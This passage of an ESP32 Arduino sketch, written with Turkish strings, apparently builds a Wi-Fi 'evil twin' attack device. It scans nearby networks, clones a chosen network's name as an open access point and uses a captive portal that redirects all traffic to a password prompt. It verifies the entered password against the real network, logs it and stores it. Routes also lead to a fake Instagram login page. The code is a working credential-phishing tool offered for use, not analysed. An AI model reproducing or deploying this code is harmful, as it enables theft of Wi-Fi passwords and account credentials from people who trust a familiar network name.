  .then(response => response.json())
  .then(data => {
    if (data.success) {
      statusDiv.className = 'status success';
      statusDiv.textContent = 'Bağlantı başarılı!';
    } else {
      statusDiv.className = 'status error';
      statusDiv.textContent = data.message;
      passwordField.value = ''; // Şifre alanını temizle
      passwordField.focus(); // Tekrar denemek için odaklan
    }
  })
  .catch(error => {
    statusDiv.className = 'status error';
    statusDiv.textContent = 'Hata oluştu: ' + error.message;
  });
});
</script>
</body>
</html>
)=====";

  webServer.send(200, "text/html; charset=utf-8", html);
}
  



//----------------------------------------------------------



void handleUpdateWifi() {
  if (webServer.method() != HTTP_POST) {
    webServer.send(405, "text/plain", "Method Not Allowed");
    return;
  }

  String password = webServer.arg("password");
  
  Serial.println("---------------------------");
  Serial.println("Şifre doğrulanıyor...");
  Serial.print("Hedef SSID: ");
  Serial.println(targetSSID);
  Serial.print("Girilen Şifre: ");
  Serial.println(password);

 
  WiFi.mode(WIFI_AP_STA); 
  
  Serial.println("Bağlantı deneniyor...");
  WiFi.begin(targetSSID.c_str(), password.c_str());

  unsigned long startTime = millis();
  bool connected = false;


  while (millis() - startTime < 10000) {
    if (WiFi.status() == WL_CONNECTED) {
      connected = true;
      break;
    }
    delay(500);
    Serial.print(".");
  }


  String response;
  if (connected) {
    savedPassword = password;
    response = "{\"success\":true,\"message\":\"Bağlantı başarılı!\"}";
    Serial.println("\nBağlantı başarılı!");
     WiFi.softAPdisconnect(true);
    isAPCreated = false;
    isInstagramAP = false;

    // Ana AP'yi (ESP32) yeniden başlat
    WiFi.mode(WIFI_AP);
    WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
    WiFi.softAP("Esp32","128milyar");
    dnsServer.start(DNS_PORT, "*", apIP);

    // Ana sayfaya yönlendir
    String html = "<script>location.href='/';</script>";
    webServer.send(200, "text/html", html);
    return;

  } else {
    response = "{\"success\":false,\"message\":\"Şifre yanlış! Lütfen tekrar deneyin.\"}";
    Serial.println("\nBağlantı başarısız! AP aktif kalmaya devam ediyor...");


  webServer.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
  webServer.sendHeader("Pragma", "no-cache");
  webServer.sendHeader("Expires", "-1");
  webServer.send(200, "application/json", response);
  }
}


//----------------------------------------------------------//----------------------------------------------------------



void handleEvilTwin() {
  scanNetworks(); 
  
  String html = R"=====(
<!DOCTYPE html>
<html lang='tr'>
<head>
  <meta charset='UTF-8'>
  <meta name='viewport' content='width=device-width, initial-scale=1.0'>
  <title>WiFi Ağları</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #403f3f;
      margin: 0;
      padding: 10px;
      display: flex;
      flex-direction: column;
      align-items: center;
      color: white;
      font-size: 14px;
    }
    h2 {
      margin: 15px 0;
      font-size: 18px;
      color: white;
    }
    table {
      border-collapse: collapse;
      width: 100%;
      max-width: 500px;
      background: #505050;
      box-shadow: 0 1px 4px rgba(0,0,0,0.15);
      border-radius: 8px;
      overflow: hidden;
      margin-bottom: 15px;
    }
    th, td {
      text-align: left;
      padding: 8px 12px;
      font-size: 12px;
      border-bottom: 1px solid #666;
      color: white;
    }
    th {
      background-color: #007bff;
      color: white;
      padding: 8px 12px;
      font-size: 12px;
    }
    tr:hover {
      background-color: #606060;
    }
    button {
      background-color: #007bff;
      color: white;
      border: none;
      border-radius: 4px;
      padding: 4px 8px;
      font-size: 12px;
      cursor: pointer;
      transition: background-color 0.2s ease;
    }
    button:hover {
      background-color: #0056b3;
    }
    a.home-link {
      margin-top: 15px;
      text-decoration: none;
      color: #007bff;
      font-weight: bold;
      font-size: 12px;
    }
    a.home-link:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <h2>Bulunan WiFi Ağları</h2>
  <table>
    <thead>
      <tr>
        <th>#</th>
        <th>SSID</th>
        <th>BSSID</th>
        <th>Kanal</th>
        <th>Seç</th>
      </tr>
    </thead>
    <tbody>
)=====";

  for(int i = 0; i < networkCount; i++) {
    html += "<tr>";
    html += "<td>" + String(i+1) + "</td>";
    html += "<td>" + networks[i].ssid + "</td>";
    html += "<td>" + networks[i].bssid + "</td>";
    html += "<td>" + String(networks[i].channel) + "</td>";
    html += "<td><button onclick=\"location.href='/select-network?ssid=" + networks[i].ssid + "&bssid=" + networks[i].bssid + "'\">Seç</button></td>";
    html += "</tr>";
  }

  html += R"=====(
    </tbody>
  </table>
  <a href="/" class="home-link">Ana Sayfaya Dön</a>
</body>
</html>
)=====";

  webServer.send(200, "text/html", html);
}


//----------------------------------------------------------//----------------------------------------------------------





void handleSelectNetwork() {
  targetSSID = webServer.arg("ssid");
  String bssid = webServer.arg("bssid");

  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(targetSSID.c_str());

  Serial.println("---------------------------");
  Serial.println("Evil Twin ağı oluşturuldu.");
  Serial.println("Wifi : " + targetSSID);
  Serial.println("---------------------------");
  
  dnsServer.start(DNS_PORT, "*", apIP);
  isAPCreated = true;
  
  if (targetSSID == "Instagram") { 
    isInstagramAP = true;
  }
  
  
  String html = "<script>location.href='/wifi-update';</script>";
  webServer.send(200, "text/html", html);
}



//----------------------------------------------------------//----------------------------------------------------------





void handleWifiAttack() {
  webServer.send(200, "text/plain", "Wifi saldırı");
}



//----------------------------------------------------------//----------------------------------------------------------


void handleWifiSpam() {
  webServer.send(200, "text/plain", "Wifi Spam");
}




//----------------------------------------------------------//----------------------------------------------------------



void handleNotFound() {
  if (isInstagramAP) {
    webServer.sendHeader("Location", "http://" + apIP.toString() + "/instagram-login", true);
  } else if (isAPCreated) {
    webServer.sendHeader("Location", "http://" + apIP.toString() + "/wifi-update", true);
  } else {
    webServer.sendHeader("Location", "http://" + apIP.toString(), true);
  }
  webServer.send(302, "text/plain", "");
}

void setup() {
  Serial.begin(9600);
  
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP("Esp32", "128milyar");
  
  dnsServer.start(DNS_PORT, "*", apIP);
  
  webServer.on("/", handleRoot);
  webServer.on("/evil-twin-password", handleEvilTwin);
  webServer.on("/evil-twin-instagram", handleInstagram);
  webServer.on("/select-network", handleSelectNetwork);
  webServer.on("/select-instagram", handleInstagramWifi);
  webServer.on("/instagram-login", handleInstagramLogin);
  webServer.on("/wifi-attack", handleWifiAttack);
  webServer.on("/wifi-spam", handleWifiSpam);
  webServer.on("/wifi-update", handleWifiUpdate);
  webServer.on("/update-wifi", HTTP_POST, handleUpdateWifi);  
  webServer.onNotFound(handleNotFound);
  
  webServer.begin();
   for (int i = 0; i < 100; i++) {
    Serial.print(".\n");
  }

  
  Serial.println();

  Serial.println("---------------------------");
  Serial.println("Captive Portal Başlatıldı!");
  Serial.println("AP SSID: Esp32");
  Serial.println("IP Adres: 192.168.4.1");
  Serial.println("---------------------------");
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
}
